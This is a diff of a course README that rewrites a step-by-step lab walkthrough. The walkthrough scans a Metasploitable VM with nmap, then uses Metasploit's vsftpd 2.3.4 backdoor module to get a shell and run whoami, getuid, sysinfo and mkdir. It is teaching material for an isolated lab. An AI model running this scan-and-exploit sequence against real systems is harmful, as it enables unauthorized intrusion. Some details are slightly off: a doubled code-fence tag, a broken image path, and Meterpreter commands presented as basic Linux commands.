@@ -1,89 +1,70 @@
-# Experiment 2: Safe Exploitation of a Vulnerable Virtual Machine using Metasploit
+# Experiment 2: Simulated Ethical Hacking with Metasploit
 
-## Aim
+## Objective
 
-To perform safe exploitation of a vulnerable virtual machine using Metasploit.
-
-## Requirements
-
-- Kali Linux
-- Metasploitable 2
-- VirtualBox/VMware
-- Nmap
-- Metasploit
-
-## Theory
-
-Metasploit is a penetration testing framework used to identify and exploit vulnerabilities in computer systems.
-
-In this experiment, Nmap is used for reconnaissance, and Metasploit is used for controlled exploitation of a vulnerable service.
+To perform a safe exploitation on a virtual machine using **Metasploit** to understand ethical hacking procedures.
 
 ## Procedure
 
-### 1. Network Setup
+### Step 1: Configure the Kali Linux and Metasploitable machines
 
-Connect Kali Linux and Metasploitable 2 using a **Host-Only Adapter** or **Internal Network**.
+Open the **Kali Linux** virtual machine as the attacker machine and the **Metasploitable** virtual machine as the target machine. Configure both virtual machines to use a **Host-only Adapter** so that they can communicate within the isolated lab network.
 
-Check the IP address of the target:
+![Step 1 Screenshot](images/1.jpg)
 
+### Step 2: Verify IP addresses and network connectivity
+
+Use `ifconfig` on both Kali Linux and Metasploitable to identify their IP addresses. From Kali Linux, ping the Metasploitable IP address to verify successful communication between the two machines.
 ```bash
 ifconfig
-Verify connectivity between Kali Linux and Metasploitable 2:
+ping <Metasploitable-IP>
+```
 
-ping <Metasploitable_IP>
-2. Nmap Scanning
+![Step 2 Screenshot](images/2.jpg)
 
-Perform a SYN scan, service version detection, and operating system detection:
+### Step 3: Scan the target using Nmap
 
-nmap -sS -sV -O <Metasploitable_IP>
+Perform a TCP SYN scan with service and OS detection from Kali Linux against the Metasploitable IP address. The scan identifies open ports, running services, and the probable operating system of the target.
+```bash
+nmap -sS -sV -O <Metasploitable-IP>
+```
 
-Identify open ports and vulnerable services from the scan results.
+![Step 3 Screenshot](images/3.jpg)
 
-3. Metasploit Exploitation
+### Step 4: Search for the vulnerable FTP service in Metasploit
 
-Start the Metasploit Framework:
-
+Start the Metasploit Framework using `msfconsole` and search for modules related to **vsftpd**. From the search results, select the appropriate exploit module for the vulnerable FTP service and load the module.
+```bash
 msfconsole
-
-Search for the vsftpd vulnerability:
-
 search vsftpd
+use <exploit-module>
+```
 
-Load the appropriate exploit:
+![Step 4 Screenshot](images/4.jpg)
 
-use exploit/unix/ftp/vsftpd_234_backdoor
+### Step 5: Configure the exploit module
 
-Set the target IP address:
+Configure the exploit with the IP address of the Metasploitable target as **RHOST** and the IP address of Kali Linux as **LHOST**.
+```bash
+set RHOST <Metasploitable-IP>
+set LHOST <Kali-IP>
+```
 
-set RHOST <Metasploitable_IP>
+![Step 5 Screenshot](images/jpg)
 
-Set the FTP port:
+### Step 6: Execute the exploit and verify access
 
-set RPORT 21
-
-Run the exploit:
-
+Execute the configured exploit using `exploit` or `run`. After obtaining a shell on the target, verify the access and execute basic Linux commands such as `whoami`, `getuid`, `sysinfo`, and create a directory to demonstrate interaction with the target system.
+```bashbash
 exploit
-
-If the target is vulnerable and the exploit succeeds, a command shell session may be opened.
-
-4. Post-Exploitation
-
-Check the current user:
-
 whoami
+getuid
+sysinfo
+mkdir <your-name>
+```
 
-Display system information:
+![Step 6 Screenshot](images/step_6.jpg)
 
-uname -a
+## Result
 
-Display network configuration:
-
-ifconfig
-Result
-
-The experiment demonstrated network scanning and controlled exploitation using Metasploit on Metasploitable 2.
-
-Conclusion
-
-Nmap was successfully used for reconnaissance to identify open ports and services. Metasploit was then used to perform controlled exploitation of the vulnerable vsftpd service in the authorized Metasploitable 2 lab environment.
+The experiment successfully demonstrated ethical exploitation of the Metasploitable system using **Metasploit** and verified access through basic Linux commands.
